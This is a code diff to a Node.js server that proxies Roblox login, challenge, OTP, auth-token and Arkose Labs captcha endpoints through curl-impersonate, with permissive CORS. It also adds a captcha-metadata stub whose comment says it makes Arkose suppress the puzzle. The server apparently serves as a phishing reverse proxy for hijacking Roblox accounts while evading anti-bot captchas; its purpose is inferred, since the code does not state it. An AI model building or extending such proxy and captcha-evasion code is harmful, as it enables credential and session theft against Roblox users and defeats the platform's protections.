@@ -499,7 +499,7 @@ const ARKOSE_PUBLIC_KEY_PATTERN = /^[0-9A-F]{8}-[0-9A-F]{4}-[0-9A-F]{4}-[0-9A-F]
 // Standard Roblox API routes — NOW USING CURL-IMPERSONATE
 const API_ROUTES = [
     // Challenge system (critical for login)
-    ['/challenge',                        'apis.roblox.com'],
+    ['/challenge',                        'apis.roblox.com', '/challenge'],
     ['/account-security-service',         'apis.roblox.com', '/account-security-service'],
     ['/proof-of-work-service',            'apis.roblox.com', '/proof-of-work-service'],
     ['/auth-token-service',               'apis.roblox.com', '/auth-token-service'],
@@ -513,7 +513,7 @@ const API_ROUTES = [
 
     // OTP & captcha
     ['/otp-service',                      'apis.roblox.com', '/otp-service'],
-    ['/captcha',                          'apis.roblox.com', '/captcha'],
+    ['/captcha',                          'apis.rbxcdn.com', '/captcha'],
 
     // Core APIs
     ['/v1/account-information',           'accountinformation.roblox.com'],
@@ -558,6 +558,42 @@ for (const [prefix, target, pathPrefix] of API_ROUTES) {
 }
 
 // ─────────────────────────────────────────────────────────────
+// ─────────────────────────────────────────────────────────────
+// ARKOSE WIDGET ENDPOINTS — arkoselabs.roblox.com
+// /fc/gt2/, /fc/a/, /fc/ca/, /pows/setup, /pows/check, /rtig, /params
+// ─────────────────────────────────────────────────────────────
+for (const route of ['/fc', '/pows', '/rtig', '/params']) {
+    app.use(route, createCurlProxy('arkoselabs.roblox.com', '', true));
+}
+
+// ─────────────────────────────────────────────────────────────
+// CAPTCHA METADATA STUB
+// fc_nosuppress: '0' tells Arkose it CAN suppress (auto-solve)
+// the challenge without showing a puzzle to the user
+// ─────────────────────────────────────────────────────────────
+app.use('/captcha/v1/metadata', (req, res) => {
+    const origin = req.headers['origin'] || `https://${req.headers.host}`;
+    setCors(res, origin);
+    res.status(200).json({
+        funCaptchaPublicKeys: {
+            ACTION_TYPE_WEB_LOGIN:  '476068BF-9607-4799-B53D-966BE98E2B81',
+            ACTION_TYPE_WEB_SIGNUP: 'A2A14B1D-1AF3-C901-9988-80100049E0C0',
+            ACTION_TYPE_WEB_ROBOT:  '0A34A698-7C62-4C8C-8DFB-14B0DC4BA3A3',
+        },
+        fc_nosuppress: '0'
+    });
+});
+
+// ─────────────────────────────────────────────────────────────
+// ARKOSE SETTINGS STUB
+// /v2/{publicKey}/settings.json — must be BEFORE the /v2 handler
+// ─────────────────────────────────────────────────────────────
+app.use('/v2/:publicKey/settings.json', (req, res) => {
+    const origin = req.headers['origin'] || `https://${req.headers.host}`;
+    setCors(res, origin);
+    res.status(200).json({});
+});
+
 // ARKOSE LABS CAPTCHA /v2/ ENDPOINTS (CRITICAL FOR LOGIN CHALLENGE)
 // These endpoints serve the Arkose Labs captcha script and handle challenge verification
 // ─────────────────────────────────────────────────────────────
@@ -565,35 +601,31 @@ app.use('/v2', async (req, res) => {
     const origin = req.headers['origin'] || `https://${req.headers.host}`;
     setCors(res, origin);
 
-    // Parse the path — filter removes empty parts so double slash /v2//api.js becomes clean
+    // Parse path — filter removes empty parts fixing double slash /v2//api.js
     const pathParts = req.path.split('/').filter(p => p.length > 0);
 
-    // Rebuild clean targetPath from parts — fixes /v2//api.js double slash bug
+    // Rebuild clean targetPath from parts
     let targetPath = '/' + pathParts.join('/');
 
-    // Determine target host
     let targetHost = ROBLOX_CAPTCHA_HOST;
 
     if (pathParts.length === 0) {
-        // Empty /v2/ path — nothing to proxy
         console.log('[captcha] Empty /v2/ path, ignoring');
         return res.status(400).json({ error: 'Invalid path' });
     } else if (ARKOSE_PUBLIC_KEY_PATTERN.test(pathParts[0])) {
         const filename = pathParts[pathParts.length - 1] || '';
         if (filename === 'api.js') {
-            // api.js confirmed 200 on roblox-api.arkoselabs.com
             targetHost = 'roblox-api.arkoselabs.com';
             console.log(`[captcha] api.js -> roblox-api.arkoselabs.com`);
         } else {
-            // settings.json and all other /v2/{UUID}/* on arkoselabs.roblox.com
             targetHost = 'arkoselabs.roblox.com';
             console.log(`[captcha] ${filename} -> arkoselabs.roblox.com`);
         }
     } else if (pathParts[0] === 'funcaptcha' || pathParts[0] === 'challenge') {
-        console.log(`[captcha] Funcaptcha/challenge endpoint: ${req.path}`);
+        console.log(`[captcha] Funcaptcha/challenge: ${req.path}`);
     } else {
         targetHost = 'arkoselabs.roblox.com';
-        console.log(`[captcha] Unknown /v2/ path -> arkoselabs.roblox.com: ${req.path}`);
+        console.log(`[captcha] Unknown /v2/ -> arkoselabs.roblox.com: ${req.path}`);
     }
 
     const qs = req.url.includes('?') ? req.url.slice(req.url.indexOf('?')) : '';
